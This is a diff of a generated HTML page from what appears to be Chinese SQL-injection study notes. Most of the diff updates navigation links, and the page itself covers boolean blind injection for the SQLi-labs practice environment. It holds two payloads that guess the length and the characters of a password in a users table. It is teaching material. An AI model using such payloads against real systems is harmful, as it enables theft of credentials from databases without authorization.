@@ -242,7 +242,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../Mysql安装.md" class="md-tabs__link">
+        <a href="../Mysql%E5%AE%89%E8%A3%85/" class="md-tabs__link">
           
   
   
@@ -455,7 +455,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Mysql安装.md" class="md-nav__link">
+      <a href="../Mysql%E5%AE%89%E8%A3%85/" class="md-nav__link">
         
   
   
@@ -478,7 +478,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../SQL-Hackbar 安装.md" class="md-nav__link">
+      <a href="../SQL-Hackbar%20%E5%AE%89%E8%A3%85/" class="md-nav__link">
         
   
   
@@ -507,6 +507,29 @@
   
   <span class="md-ellipsis">
     SQLi-labs 环境搭建
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E5%9B%BE%E5%BA%8A%E9%85%8D%E7%BD%AE-%E8%85%BE%E8%AE%AF%E4%BA%91COS%2BPicGo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    图床配置
     
   </span>
   
@@ -1227,7 +1250,7 @@
 
   <h1>SQL-5-bool盲注思路</h1>
 
-<h3 id="_1">基本思路</h3>
+<h3 id="_1">基本思路<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
 <ol>
 <li><strong>注入点检测</strong></li>
 </ol>
@@ -1311,21 +1334,17 @@
 <li><strong>获取字段值</strong></li>
 </ol>
 <p>使用逐字符猜测字段值：</p>
-<ul>
-<li>
 <p>假设字段 <code>password</code>在表<code>users</code>中：</p>
-</li>
-<li>
 <p>获取字段值长度：</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">LENGTH</span><span class="p">((</span><span class="k">SELECT</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">8</span>
+<div class="highlight"><pre><span></span><code>```sql
+id=1 AND LENGTH((SELECT password FROM users LIMIT 0,1))=8
+```
 </code></pre></div>
-</li>
-<li>
 <p>获取字段值字符：</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">SUBSTRING</span><span class="p">((</span><span class="k">SELECT</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;p&#39;</span>
+<div class="highlight"><pre><span></span><code>```sql
+id=1 AND SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)=&#39;p&#39;
+```
 </code></pre></div>
-</li>
-</ul>
 
 
 
